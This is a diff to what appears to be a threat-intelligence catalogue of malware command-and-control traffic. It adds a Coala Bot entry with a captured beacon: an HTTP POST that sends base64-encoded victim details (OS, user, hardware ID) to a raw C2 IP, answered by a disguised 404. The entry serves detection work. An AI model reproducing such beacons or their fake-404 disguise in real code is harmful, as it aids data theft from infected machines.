@@ -240,6 +240,36 @@ try {"6f7074696f6e73ProcessorId"; $disks = gwmi Win32_Volume -filter "Name='C:\\
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/brushaloader.png "Brushaloader")
 
+#### Coala Bot
+Uses fake 404
+~~~
+POST /jjj888/skghn.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/12.0.1576.62 Safari/537.26
+Content-Type: application/x-www-form-urlencoded
+Host: 185.170.43.187
+Content-Length: 120
+Expect: 100-continue
+Connection: Close
+
+HTTP/1.1 100 Continue
+
+Jk1pY3Jvc29mdCBXaW5kb3dzIDcgUHJvZmVzc2lvbmFsIHgzMiZhZG1pbiY4NjNCLUJFQUItOEZDNi0yMEJGLTlDMDktMkY1NS01OEUxLUExRDYmRmFsc2U(
+    
+HTTP/1.0 404 Not Found
+Date: Tue, 15 Jan 2019 13:20:17 GMT
+Server: Apache/2.4.10 (Debian)
+Set-Cookie: PHPSESSID=euhbs94osbalc0ubsfl5c2v324; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 88
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+MTAzNDE2MzR0MTdoYWhkQkZ1amRmYnd1cmhmbmllZmhydWZoYm5maGdmeVREZmJHRlZ5V2d2ZnwxNTQ3NTU4NDE3
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/coala.png "Coala Bot")
+
 #### Cobaltstrike
 ~~~
 GET /Mdt7 HTTP/1.1
